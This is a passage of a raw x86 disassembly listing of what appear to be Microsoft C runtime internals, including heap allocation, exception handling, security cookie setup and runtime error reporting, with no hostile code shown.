  426eb3:	mov    edi,0x80000000
  426eb8:	shr    edi,cl
  426eba:	mov    ecx,DWORD PTR [ebp+0x8]
  426ebd:	or     DWORD PTR [ecx],edi
  426ebf:	lea    eax,[eax+edx*4+0x44]
  426ec3:	mov    ecx,esi
  426ec5:	jmp    0x426ee7
  426ec7:	cmp    BYTE PTR [ebp+0xf],0x0
  426ecb:	jne    0x426edd
  426ecd:	lea    ecx,[esi-0x20]
  426ed0:	mov    edi,0x80000000
  426ed5:	shr    edi,cl
  426ed7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eda:	or     DWORD PTR [ecx+0x4],edi
  426edd:	lea    eax,[eax+edx*4+0xc4]
  426ee4:	lea    ecx,[esi-0x20]
  426ee7:	mov    edx,0x80000000
  426eec:	shr    edx,cl
  426eee:	or     DWORD PTR [eax],edx
  426ef0:	mov    eax,DWORD PTR [ebp+0x10]
  426ef3:	mov    DWORD PTR [ebx],eax
  426ef5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426ef9:	xor    eax,eax
  426efb:	inc    eax
  426efc:	pop    edi
  426efd:	pop    esi
  426efe:	pop    ebx
  426eff:	leave  
  426f00:	ret    
  426f01:	push   ebp
  426f02:	mov    ebp,esp
  426f04:	sub    esp,0x14
  426f07:	mov    ecx,DWORD PTR [ebp+0x8]
  426f0a:	mov    eax,ds:0x45defc
  426f0f:	mov    edx,DWORD PTR ds:0x45df00
  426f15:	add    ecx,0x17
  426f18:	and    ecx,0xfffffff0
  426f1b:	push   ebx
  426f1c:	mov    DWORD PTR [ebp-0x10],ecx
  426f1f:	sar    ecx,0x4
  426f22:	push   esi
  426f23:	lea    eax,[eax+eax*4]
  426f26:	push   edi
  426f27:	dec    ecx
  426f28:	cmp    ecx,0x20
  426f2b:	lea    edi,[edx+eax*4]
  426f2e:	mov    DWORD PTR [ebp-0x4],edi
  426f31:	jge    0x426f3e
  426f33:	or     esi,0xffffffff
  426f36:	shr    esi,cl
  426f38:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f3c:	jmp    0x426f4b
  426f3e:	add    ecx,0xffffffe0
  426f41:	or     eax,0xffffffff
  426f44:	xor    esi,esi
  426f46:	shr    eax,cl
  426f48:	mov    DWORD PTR [ebp-0x8],eax
  426f4b:	mov    eax,ds:0x45df08
  426f50:	mov    ebx,eax
  426f52:	mov    DWORD PTR [ebp-0xc],esi
  426f55:	cmp    ebx,edi
  426f57:	jmp    0x426f6d
  426f59:	mov    ecx,DWORD PTR [ebx+0x4]
  426f5c:	mov    edi,DWORD PTR [ebx]
  426f5e:	and    ecx,DWORD PTR [ebp-0x8]
  426f61:	and    edi,esi
  426f63:	or     ecx,edi
  426f65:	jne    0x426f72
  426f67:	add    ebx,0x14
  426f6a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f6d:	mov    DWORD PTR [ebp+0x8],ebx
  426f70:	jb     0x426f59
  426f72:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f75:	jne    0x426f9b
  426f77:	mov    ebx,edx
  426f79:	jmp    0x426f8c
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    edi,DWORD PTR [ebx]
  426f80:	and    ecx,DWORD PTR [ebp-0x8]
  426f83:	and    edi,esi
  426f85:	or     ecx,edi
  426f87:	jne    0x426f93
  426f89:	add    ebx,0x14
  426f8c:	cmp    ebx,eax
  426f8e:	mov    DWORD PTR [ebp+0x8],ebx
  426f91:	jb     0x426f7b
  426f93:	cmp    ebx,eax
  426f95:	je     0x42702f
  426f9b:	mov    DWORD PTR ds:0x45df08,ebx
  426fa1:	mov    eax,DWORD PTR [ebx+0x10]
  426fa4:	mov    edx,DWORD PTR [eax]
  426fa6:	cmp    edx,0xffffffff
  426fa9:	mov    DWORD PTR [ebp-0x4],edx
  426fac:	je     0x426fc2
  426fae:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fb5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fb9:	and    ecx,DWORD PTR [ebp-0x8]
  426fbc:	and    edi,esi
  426fbe:	or     ecx,edi
  426fc0:	jne    0x426ff8
  426fc2:	mov    edx,DWORD PTR [eax+0xc4]
  426fc8:	and    edx,DWORD PTR [ebp-0x8]
  426fcb:	and    DWORD PTR [ebp-0x4],0x0
  426fcf:	lea    ecx,[eax+0x44]
  426fd2:	mov    esi,DWORD PTR [ecx]
  426fd4:	and    esi,DWORD PTR [ebp-0xc]
  426fd7:	or     edx,esi
  426fd9:	mov    esi,DWORD PTR [ebp-0xc]
  426fdc:	jne    0x426ff5
  426fde:	mov    edx,DWORD PTR [ecx+0x84]
  426fe4:	and    edx,DWORD PTR [ebp-0x8]
  426fe7:	inc    DWORD PTR [ebp-0x4]
  426fea:	add    ecx,0x4
  426fed:	mov    edi,DWORD PTR [ecx]
  426fef:	and    edi,esi
  426ff1:	or     edx,edi
  426ff3:	je     0x426fde
  426ff5:	mov    edx,DWORD PTR [ebp-0x4]
  426ff8:	mov    ecx,edx
  426ffa:	imul   ecx,ecx,0x204
  427000:	lea    ecx,[ecx+eax*1+0x144]
  427007:	mov    DWORD PTR [ebp-0xc],ecx
  42700a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42700e:	xor    edi,edi
  427010:	and    ecx,esi
  427012:	jne    0x427081
  427014:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42701b:	and    ecx,DWORD PTR [ebp-0x8]
  42701e:	push   0x20
  427020:	pop    edi
  427021:	jmp    0x427081
  427023:	cmp    DWORD PTR [ebx+0x8],0x0
  427027:	jne    0x427034
  427029:	add    ebx,0x14
  42702c:	mov    DWORD PTR [ebp+0x8],ebx
  42702f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427032:	jb     0x427023
  427034:	cmp    ebx,DWORD PTR [ebp-0x4]
  427037:	jne    0x42705f
  427039:	mov    ebx,edx
  42703b:	jmp    0x427046
  42703d:	cmp    DWORD PTR [ebx+0x8],0x0
  427041:	jne    0x42704d
  427043:	add    ebx,0x14
  427046:	cmp    ebx,eax
  427048:	mov    DWORD PTR [ebp+0x8],ebx
  42704b:	jb     0x42703d
  42704d:	cmp    ebx,eax
  42704f:	jne    0x42705f
  427051:	call   0x426a65
  427056:	mov    ebx,eax
  427058:	test   ebx,ebx
  42705a:	mov    DWORD PTR [ebp+0x8],ebx
  42705d:	je     0x427077
  42705f:	push   ebx
  427060:	call   0x426b1c
  427065:	pop    ecx
  427066:	mov    ecx,DWORD PTR [ebx+0x10]
  427069:	mov    DWORD PTR [ecx],eax
  42706b:	mov    eax,DWORD PTR [ebx+0x10]
  42706e:	cmp    DWORD PTR [eax],0xffffffff
  427071:	jne    0x426f9b
  427077:	xor    eax,eax
  427079:	jmp    0x4271f8
  42707e:	shl    ecx,1
  427080:	inc    edi
  427081:	test   ecx,ecx
  427083:	jge    0x42707e
  427085:	mov    ecx,DWORD PTR [ebp-0xc]
  427088:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42708c:	mov    ecx,DWORD PTR [edx]
  42708e:	sub    ecx,DWORD PTR [ebp-0x10]
  427091:	mov    esi,ecx
  427093:	sar    esi,0x4
  427096:	dec    esi
  427097:	cmp    esi,0x3f
  42709a:	mov    DWORD PTR [ebp-0x8],ecx
  42709d:	jle    0x4270a2
  42709f:	push   0x3f
  4270a1:	pop    esi
  4270a2:	cmp    esi,edi
  4270a4:	je     0x4271ab
  4270aa:	mov    ecx,DWORD PTR [edx+0x4]
  4270ad:	cmp    ecx,DWORD PTR [edx+0x8]
  4270b0:	jne    0x42710e
  4270b2:	cmp    edi,0x20
  4270b5:	mov    ebx,0x80000000
  4270ba:	jge    0x4270e2
  4270bc:	mov    ecx,edi
  4270be:	shr    ebx,cl
  4270c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270c3:	lea    edi,[eax+edi*1+0x4]
  4270c7:	not    ebx
  4270c9:	mov    DWORD PTR [ebp-0x14],ebx
  4270cc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270d0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270d4:	dec    BYTE PTR [edi]
  4270d6:	jne    0x42710b
  4270d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270db:	mov    ebx,DWORD PTR [ebp+0x8]
  4270de:	and    DWORD PTR [ebx],ecx
  4270e0:	jmp    0x42710e
  4270e2:	lea    ecx,[edi-0x20]
  4270e5:	shr    ebx,cl
  4270e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270ea:	lea    ecx,[eax+ecx*4+0xc4]
  4270f1:	lea    edi,[eax+edi*1+0x4]
  4270f5:	not    ebx
  4270f7:	and    DWORD PTR [ecx],ebx
  4270f9:	dec    BYTE PTR [edi]
  4270fb:	mov    DWORD PTR [ebp-0x14],ebx
  4270fe:	jne    0x42710b
  427100:	mov    ebx,DWORD PTR [ebp+0x8]
  427103:	mov    ecx,DWORD PTR [ebp-0x14]
  427106:	and    DWORD PTR [ebx+0x4],ecx
  427109:	jmp    0x42710e
  42710b:	mov    ebx,DWORD PTR [ebp+0x8]
  42710e:	cmp    DWORD PTR [ebp-0x8],0x0
  427112:	mov    ecx,DWORD PTR [edx+0x8]
  427115:	mov    edi,DWORD PTR [edx+0x4]
  427118:	mov    DWORD PTR [ecx+0x4],edi
  42711b:	mov    ecx,DWORD PTR [edx+0x4]
  42711e:	mov    edi,DWORD PTR [edx+0x8]
  427121:	mov    DWORD PTR [ecx+0x8],edi
  427124:	je     0x4271b7
  42712a:	mov    ecx,DWORD PTR [ebp-0xc]
  42712d:	lea    ecx,[ecx+esi*8]
  427130:	mov    edi,DWORD PTR [ecx+0x4]
  427133:	mov    DWORD PTR [edx+0x8],ecx
  427136:	mov    DWORD PTR [edx+0x4],edi
  427139:	mov    DWORD PTR [ecx+0x4],edx
  42713c:	mov    ecx,DWORD PTR [edx+0x4]
  42713f:	mov    DWORD PTR [ecx+0x8],edx
  427142:	mov    ecx,DWORD PTR [edx+0x4]
  427145:	cmp    ecx,DWORD PTR [edx+0x8]
  427148:	jne    0x4271a8
  42714a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42714e:	mov    BYTE PTR [ebp+0xb],cl
  427151:	inc    cl
  427153:	cmp    esi,0x20
  427156:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42715a:	jge    0x42717f
  42715c:	cmp    BYTE PTR [ebp+0xb],0x0
  427160:	jne    0x42716d
  427162:	mov    edi,0x80000000
  427167:	mov    ecx,esi
  427169:	shr    edi,cl
  42716b:	or     DWORD PTR [ebx],edi
  42716d:	mov    ecx,esi
  42716f:	mov    edi,0x80000000
  427174:	shr    edi,cl
  427176:	mov    ecx,DWORD PTR [ebp-0x4]
  427179:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42717d:	jmp    0x4271a8
  42717f:	cmp    BYTE PTR [ebp+0xb],0x0
  427183:	jne    0x427192
  427185:	lea    ecx,[esi-0x20]
  427188:	mov    edi,0x80000000
  42718d:	shr    edi,cl
  42718f:	or     DWORD PTR [ebx+0x4],edi
  427192:	mov    ecx,DWORD PTR [ebp-0x4]
  427195:	lea    edi,[eax+ecx*4+0xc4]
  42719c:	lea    ecx,[esi-0x20]
  42719f:	mov    esi,0x80000000
  4271a4:	shr    esi,cl
  4271a6:	or     DWORD PTR [edi],esi
  4271a8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ab:	test   ecx,ecx
  4271ad:	je     0x4271ba
  4271af:	mov    DWORD PTR [edx],ecx
  4271b1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271b5:	jmp    0x4271ba
  4271b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ba:	mov    esi,DWORD PTR [ebp-0x10]
  4271bd:	add    edx,ecx
  4271bf:	lea    ecx,[esi+0x1]
  4271c2:	mov    DWORD PTR [edx],ecx
  4271c4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271c8:	mov    esi,DWORD PTR [ebp-0xc]
  4271cb:	mov    ecx,DWORD PTR [esi]
  4271cd:	test   ecx,ecx
  4271cf:	lea    edi,[ecx+0x1]
  4271d2:	mov    DWORD PTR [esi],edi
  4271d4:	jne    0x4271f0
  4271d6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271dc:	jne    0x4271f0
  4271de:	mov    ecx,DWORD PTR [ebp-0x4]
  4271e1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271e7:	jne    0x4271f0
  4271e9:	and    DWORD PTR ds:0x45def8,0x0
  4271f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f3:	mov    DWORD PTR [eax],ecx
  4271f5:	lea    eax,[edx+0x4]
  4271f8:	pop    edi
  4271f9:	pop    esi
  4271fa:	pop    ebx
  4271fb:	leave  
  4271fc:	ret    
  4271fd:	int3   
  4271fe:	int3   
  4271ff:	int3   
  427200:	push   esi
  427201:	inc    ebx
  427202:	xor    dh,BYTE PTR [eax]
  427204:	pop    eax
  427205:	inc    ebx
  427206:	xor    BYTE PTR [eax],dh
  427208:	push   ebp
  427209:	mov    ebp,esp
  42720b:	sub    esp,0x8
  42720e:	push   ebx
  42720f:	push   esi
  427210:	push   edi
  427211:	push   ebp
  427212:	cld    
  427213:	mov    ebx,DWORD PTR [ebp+0xc]
  427216:	mov    eax,DWORD PTR [ebp+0x8]
  427219:	test   DWORD PTR [eax+0x4],0x6
  427220:	jne    0x4272a8
  427226:	mov    DWORD PTR [ebp-0x8],eax
  427229:	mov    eax,DWORD PTR [ebp+0x10]
  42722c:	mov    DWORD PTR [ebp-0x4],eax
  42722f:	lea    eax,[ebp-0x8]
  427232:	mov    DWORD PTR [ebx-0x4],eax
  427235:	mov    esi,DWORD PTR [ebx+0xc]
  427238:	mov    edi,DWORD PTR [ebx+0x8]
  42723b:	cmp    esi,0xffffffff
  42723e:	je     0x4272a1
  427240:	lea    ecx,[esi+esi*2]
  427243:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427248:	je     0x42728f
  42724a:	push   esi
  42724b:	push   ebp
  42724c:	lea    ebp,[ebx+0x10]
  42724f:	call   DWORD PTR [edi+ecx*4+0x4]
  427253:	pop    ebp
  427254:	pop    esi
  427255:	mov    ebx,DWORD PTR [ebp+0xc]
  427258:	or     eax,eax
  42725a:	je     0x42728f
  42725c:	js     0x42729a
  42725e:	mov    edi,DWORD PTR [ebx+0x8]
  427261:	push   ebx
  427262:	call   0x428190
  427267:	add    esp,0x4
  42726a:	lea    ebp,[ebx+0x10]
  42726d:	push   esi
  42726e:	push   ebx
  42726f:	call   0x4281d2
  427274:	add    esp,0x8
  427277:	lea    ecx,[esi+esi*2]
  42727a:	push   0x1
  42727c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427280:	call   0x428266
  427285:	mov    eax,DWORD PTR [edi+ecx*4]
  427288:	mov    DWORD PTR [ebx+0xc],eax
  42728b:	call   DWORD PTR [edi+ecx*4+0x8]
  42728f:	mov    edi,DWORD PTR [ebx+0x8]
  427292:	lea    ecx,[esi+esi*2]
  427295:	mov    esi,DWORD PTR [edi+ecx*4]
  427298:	jmp    0x42723b
  42729a:	mov    eax,0x0
  42729f:	jmp    0x4272bd
  4272a1:	mov    eax,0x1
  4272a6:	jmp    0x4272bd
  4272a8:	push   ebp
  4272a9:	lea    ebp,[ebx+0x10]
  4272ac:	push   0xffffffff
  4272ae:	push   ebx
  4272af:	call   0x4281d2
  4272b4:	add    esp,0x8
  4272b7:	pop    ebp
  4272b8:	mov    eax,0x1
  4272bd:	pop    ebp
  4272be:	pop    edi
  4272bf:	pop    esi
  4272c0:	pop    ebx
  4272c1:	mov    esp,ebp
  4272c3:	pop    ebp
  4272c4:	ret    
  4272c5:	push   ebp
  4272c6:	mov    ecx,DWORD PTR [esp+0x8]
  4272ca:	mov    ebp,DWORD PTR [ecx]
  4272cc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272cf:	push   eax
  4272d0:	mov    eax,DWORD PTR [ecx+0x18]
  4272d3:	push   eax
  4272d4:	call   0x4281d2
  4272d9:	add    esp,0x8
  4272dc:	pop    ebp
  4272dd:	ret    0x4
  4272e0:	call   0x4251f3
  4272e5:	add    eax,0x8
  4272e8:	ret    
  4272e9:	push   0x14
  4272eb:	push   0x429878
  4272f0:	call   0x425340
  4272f5:	mov    edi,DWORD PTR [ebp+0x8]
  4272f8:	xor    ebx,ebx
  4272fa:	cmp    edi,ebx
  4272fc:	jne    0x42730c
  4272fe:	push   DWORD PTR [ebp+0xc]
  427301:	call   0x426062
  427306:	pop    ecx
  427307:	jmp    0x427490
  42730c:	mov    esi,DWORD PTR [ebp+0xc]
  42730f:	cmp    esi,ebx
  427311:	jne    0x42731f
  427313:	push   edi
  427314:	call   0x425f4a
  427319:	pop    ecx
  42731a:	jmp    0x42748e
  42731f:	cmp    DWORD PTR ds:0x45e144,0x3
  427326:	jne    0x42745a
  42732c:	mov    DWORD PTR [ebp-0x1c],ebx
  42732f:	cmp    esi,0xffffffe0
  427332:	ja     0x427429
  427338:	push   0x4
  42733a:	call   0x4254ff
  42733f:	pop    ecx
  427340:	mov    DWORD PTR [ebp-0x4],ebx
  427343:	push   edi
  427344:	call   0x426722
  427349:	pop    ecx
  42734a:	mov    DWORD PTR [ebp-0x20],eax
  42734d:	cmp    eax,ebx
  42734f:	je     0x4273f9
  427355:	cmp    esi,DWORD PTR ds:0x45df04
  42735b:	ja     0x4273a9
  42735d:	push   esi
  42735e:	push   edi
  42735f:	push   eax
  427360:	call   0x426c22
  427365:	add    esp,0xc
  427368:	test   eax,eax
  42736a:	je     0x427371
  42736c:	mov    DWORD PTR [ebp-0x1c],edi
  42736f:	jmp    0x4273a9
  427371:	push   esi
  427372:	call   0x426f01
  427377:	pop    ecx
  427378:	mov    DWORD PTR [ebp-0x1c],eax
  42737b:	cmp    eax,ebx
  42737d:	je     0x4273a9
  42737f:	mov    eax,DWORD PTR [edi-0x4]
  427382:	dec    eax
  427383:	mov    DWORD PTR [ebp-0x24],eax
  427386:	cmp    eax,esi
  427388:	jb     0x42738c
  42738a:	mov    eax,esi
  42738c:	push   eax
  42738d:	push   edi
  42738e:	push   DWORD PTR [ebp-0x1c]
  427391:	call   0x426080
  427396:	push   edi
  427397:	call   0x426722
  42739c:	mov    DWORD PTR [ebp-0x20],eax
  42739f:	push   edi
  4273a0:	push   eax
  4273a1:	call   0x42674d
  4273a6:	add    esp,0x18
  4273a9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273ac:	jne    0x4273f9
  4273ae:	cmp    esi,ebx
  4273b0:	jne    0x4273b8
  4273b2:	xor    esi,esi
  4273b4:	inc    esi
  4273b5:	mov    DWORD PTR [ebp+0xc],esi
  4273b8:	add    esi,0xf
  4273bb:	and    esi,0xfffffff0
  4273be:	mov    DWORD PTR [ebp+0xc],esi
  4273c1:	push   esi
  4273c2:	push   ebx
  4273c3:	push   DWORD PTR ds:0x45e140
  4273c9:	call   DWORD PTR ds:0x429030
  4273cf:	mov    DWORD PTR [ebp-0x1c],eax
  4273d2:	cmp    eax,ebx
  4273d4:	je     0x4273f9
  4273d6:	mov    eax,DWORD PTR [edi-0x4]
  4273d9:	dec    eax
  4273da:	mov    DWORD PTR [ebp-0x24],eax
  4273dd:	cmp    eax,esi
  4273df:	jb     0x4273e3
  4273e1:	mov    eax,esi
  4273e3:	push   eax
  4273e4:	push   edi
  4273e5:	push   DWORD PTR [ebp-0x1c]
  4273e8:	call   0x426080
  4273ed:	push   edi
  4273ee:	push   DWORD PTR [ebp-0x20]
  4273f1:	call   0x42674d
  4273f6:	add    esp,0x14
  4273f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4273fd:	call   0x427451
  427402:	cmp    DWORD PTR [ebp-0x20],ebx
  427405:	jne    0x427429
  427407:	cmp    esi,ebx
  427409:	jne    0x42740e
  42740b:	xor    esi,esi
  42740d:	inc    esi
  42740e:	add    esi,0xf
  427411:	and    esi,0xfffffff0
  427414:	mov    DWORD PTR [ebp+0xc],esi
  427417:	push   esi
  427418:	push   edi
  427419:	push   ebx
  42741a:	push   DWORD PTR ds:0x45e140
  427420:	call   DWORD PTR ds:0x4290d0
  427426:	mov    DWORD PTR [ebp-0x1c],eax
  427429:	mov    eax,DWORD PTR [ebp-0x1c]
  42742c:	cmp    eax,ebx
  42742e:	jne    0x427490
  427430:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427436:	je     0x427490
  427438:	push   esi
  427439:	call   0x427c22
  42743e:	pop    ecx
  42743f:	test   eax,eax
  427441:	jne    0x42732c
  427447:	jmp    0x42748e
  427449:	xor    ebx,ebx
  42744b:	mov    esi,DWORD PTR [ebp+0xc]
  42744e:	mov    edi,DWORD PTR [ebp+0x8]
  427451:	push   0x4
  427453:	call   0x42546b
  427458:	pop    ecx
  427459:	ret    
  42745a:	xor    eax,eax
  42745c:	cmp    esi,0xffffffe0
  42745f:	ja     0x427477
  427461:	cmp    esi,ebx
  427463:	jne    0x427468
  427465:	xor    esi,esi
  427467:	inc    esi
  427468:	push   esi
  427469:	push   edi
  42746a:	push   ebx
  42746b:	push   DWORD PTR ds:0x45e140
  427471:	call   DWORD PTR ds:0x4290d0
  427477:	cmp    eax,ebx
  427479:	jne    0x427490
  42747b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427481:	je     0x427490
  427483:	push   esi
  427484:	call   0x427c22
  427489:	pop    ecx
  42748a:	test   eax,eax
  42748c:	jne    0x42745a
  42748e:	xor    eax,eax
  427490:	call   0x42537b
  427495:	ret    
  427496:	push   0x10
  427498:	push   0x429888
  42749d:	call   0x425340
  4274a2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274a9:	jne    0x4274e5
  4274ab:	push   0x4
  4274ad:	call   0x4254ff
  4274b2:	pop    ecx
  4274b3:	and    DWORD PTR [ebp-0x4],0x0
  4274b7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ba:	push   esi
  4274bb:	call   0x426722
  4274c0:	pop    ecx
  4274c1:	mov    DWORD PTR [ebp-0x1c],eax
  4274c4:	test   eax,eax
  4274c6:	je     0x4274d3
  4274c8:	mov    esi,DWORD PTR [esi-0x4]
  4274cb:	sub    esi,0x9
  4274ce:	mov    DWORD PTR [ebp-0x20],esi
  4274d1:	jmp    0x4274d6
  4274d3:	mov    esi,DWORD PTR [ebp-0x20]
  4274d6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274da:	call   0x427503
  4274df:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274e3:	jne    0x4274f8
  4274e5:	push   DWORD PTR [ebp+0x8]
  4274e8:	push   0x0
  4274ea:	push   DWORD PTR ds:0x45e140
  4274f0:	call   DWORD PTR ds:0x4290d4
  4274f6:	mov    esi,eax
  4274f8:	mov    eax,esi
  4274fa:	call   0x42537b
  4274ff:	ret    
  427500:	mov    esi,DWORD PTR [ebp-0x20]
  427503:	push   0x4
  427505:	call   0x42546b
  42750a:	pop    ecx
  42750b:	ret    
  42750c:	push   ebp
  42750d:	mov    ebp,esp
  42750f:	sub    esp,0x10
  427512:	push   esi
  427513:	lea    eax,[ebp-0x8]
  427516:	push   eax
  427517:	call   DWORD PTR ds:0x4290e4
  42751d:	mov    esi,DWORD PTR [ebp-0x4]
  427520:	xor    esi,DWORD PTR [ebp-0x8]
  427523:	call   DWORD PTR ds:0x4290e0
  427529:	xor    esi,eax
  42752b:	call   DWORD PTR ds:0x429098
  427531:	xor    esi,eax
  427533:	call   DWORD PTR ds:0x4290dc
  427539:	xor    esi,eax
  42753b:	lea    eax,[ebp-0x10]
  42753e:	push   eax
  42753f:	call   DWORD PTR ds:0x4290d8
  427545:	mov    eax,DWORD PTR [ebp-0xc]
  427548:	xor    eax,DWORD PTR [ebp-0x10]
  42754b:	xor    esi,eax
  42754d:	mov    DWORD PTR ds:0x45d430,esi
  427553:	jne    0x42755f
  427555:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42755f:	pop    esi
  427560:	leave  
  427561:	ret    
  427562:	push   0x118
  427567:	push   0x429a38
  42756c:	call   0x425340
  427571:	mov    eax,ds:0x45d430
  427576:	xor    eax,DWORD PTR [ebp+0x4]
  427579:	mov    DWORD PTR [ebp-0x1c],eax
  42757c:	mov    eax,ds:0x45dd98
  427581:	xor    ecx,ecx
  427583:	cmp    eax,ecx
  427585:	je     0x4275a6
  427587:	mov    DWORD PTR [ebp-0x4],ecx
  42758a:	push   DWORD PTR [ebp+0xc]
  42758d:	push   DWORD PTR [ebp+0x8]
  427590:	call   eax
  427592:	pop    ecx
  427593:	pop    ecx
  427594:	or     DWORD PTR [ebp-0x4],0xffffffff
  427598:	jmp    0x4276a4
  42759d:	xor    eax,eax
  42759f:	inc    eax
  4275a0:	ret    
  4275a1:	mov    esp,DWORD PTR [ebp-0x18]
  4275a4:	jmp    0x427594
  4275a6:	mov    eax,DWORD PTR [ebp+0x8]
  4275a9:	dec    eax
  4275aa:	je     0x4275bf
  4275ac:	mov    edi,0x429a14
  4275b1:	mov    DWORD PTR [ebp-0x20],0x429960
  4275b8:	mov    esi,0xd4
  4275bd:	jmp    0x4275d0
  4275bf:	mov    edi,0x429940
  4275c4:	mov    DWORD PTR [ebp-0x20],0x4298a0
  4275cb:	mov    esi,0xb9
  4275d0:	mov    BYTE PTR [ebp-0x24],cl
  4275d3:	push   0x104
  4275d8:	lea    eax,[ebp-0x128]
  4275de:	push   eax
  4275df:	push   ecx
  4275e0:	call   DWORD PTR ds:0x429068
  4275e6:	test   eax,eax
  4275e8:	jne    0x4275fd
  4275ea:	push   0x429594
  4275ef:	lea    eax,[ebp-0x128]
  4275f5:	push   eax
  4275f6:	call   0x425720
  4275fb:	pop    ecx
  4275fc:	pop    ecx
  4275fd:	lea    ebx,[ebp-0x128]
  427603:	lea    eax,[ebp-0x128]
  427609:	push   eax
  42760a:	call   0x425950
  42760f:	pop    ecx
  427610:	add    eax,0xb
  427613:	cmp    eax,0x3c
  427616:	jbe    0x427641
  427618:	lea    eax,[ebp-0x128]
  42761e:	push   eax
  42761f:	call   0x425950
  427624:	mov    ebx,eax
  427626:	lea    eax,[ebp-0x128]
  42762c:	sub    eax,0x31
  42762f:	add    ebx,eax
  427631:	push   0x3
  427633:	push   0x429590
  427638:	push   ebx
  427639:	call   0x425820
  42763e:	add    esp,0x10
  427641:	push   ebx
  427642:	call   0x425950
  427647:	pop    ecx
  427648:	lea    eax,[eax+esi*1+0xc]
  42764c:	add    eax,0x3
  42764f:	and    eax,0xfffffffc
  427652:	call   0x425390
  427657:	mov    DWORD PTR [ebp-0x18],esp
  42765a:	mov    esi,esp
  42765c:	push   edi
  42765d:	push   esi
  42765e:	call   0x425720
  427663:	mov    edi,0x429570
  427668:	push   edi
  427669:	push   esi
  42766a:	call   0x425730
  42766f:	push   0x429894
  427674:	push   esi
  427675:	call   0x425730
  42767a:	push   ebx
  42767b:	push   esi
  42767c:	call   0x425730
  427681:	push   edi
  427682:	push   esi
  427683:	call   0x425730
  427688:	push   DWORD PTR [ebp-0x20]
  42768b:	push   esi
  42768c:	call   0x425730
  427691:	push   0x12010
  427696:	push   0x429548
  42769b:	push   esi
  42769c:	call   0x425622
  4276a1:	add    esp,0x3c
  4276a4:	push   0x3
  4276a6:	call   0x4247ac
  4276ab:	int3   
  4276ac:	push   0x38
  4276ae:	push   0x429e58
  4276b3:	call   0x425340
  4276b8:	xor    ebx,ebx
  4276ba:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276c0:	jne    0x4276fa
  4276c2:	push   ebx
  4276c3:	push   ebx
  4276c4:	xor    esi,esi
  4276c6:	inc    esi
  4276c7:	push   esi
  4276c8:	push   0x429e54
  4276cd:	push   0x100
  4276d2:	push   ebx
  4276d3:	call   DWORD PTR ds:0x4290f0
  4276d9:	test   eax,eax
  4276db:	je     0x4276e5
  4276dd:	mov    DWORD PTR ds:0x45ddbc,esi
  4276e3:	jmp    0x4276fa
  4276e5:	call   DWORD PTR ds:0x429044
  4276eb:	cmp    eax,0x78
  4276ee:	jne    0x4276fa
  4276f0:	mov    DWORD PTR ds:0x45ddbc,0x2
  4276fa:	cmp    DWORD PTR [ebp+0x14],ebx
  4276fd:	jle    0x42771a
  4276ff:	mov    ecx,DWORD PTR [ebp+0x14]
  427702:	mov    eax,DWORD PTR [ebp+0x10]
  427705:	dec    ecx
  427706:	cmp    BYTE PTR [eax],bl
  427708:	je     0x427712
  42770a:	inc    eax
  42770b:	cmp    ecx,ebx
  42770d:	jne    0x427705
  42770f:	or     ecx,0xffffffff
  427712:	or     eax,0xffffffff
  427715:	sub    eax,ecx
  427717:	add    DWORD PTR [ebp+0x14],eax
  42771a:	mov    eax,ds:0x45ddbc
  42771f:	cmp    eax,0x2
  427722:	je     0x427904
  427728:	cmp    eax,ebx
  42772a:	je     0x427904
  427730:	cmp    eax,0x1
  427733:	jne    0x427937
  427739:	xor    edi,edi
  42773b:	mov    DWORD PTR [ebp-0x1c],edi
  42773e:	mov    DWORD PTR [ebp-0x20],ebx
  427741:	mov    DWORD PTR [ebp-0x24],ebx
  427744:	cmp    DWORD PTR [ebp+0x20],ebx
  427747:	jne    0x427751
  427749:	mov    eax,ds:0x45ddb4
  42774e:	mov    DWORD PTR [ebp+0x20],eax
  427751:	push   ebx
  427752:	push   ebx
  427753:	push   DWORD PTR [ebp+0x14]
  427756:	push   DWORD PTR [ebp+0x10]
  427759:	xor    eax,eax
  42775b:	cmp    DWORD PTR [ebp+0x24],ebx
  42775e:	setne  al
  427761:	lea    eax,[eax*8+0x1]
  427768:	push   eax
  427769:	push   DWORD PTR [ebp+0x20]
  42776c:	call   DWORD PTR ds:0x4290ec
  427772:	mov    esi,eax
  427774:	mov    DWORD PTR [ebp-0x28],esi
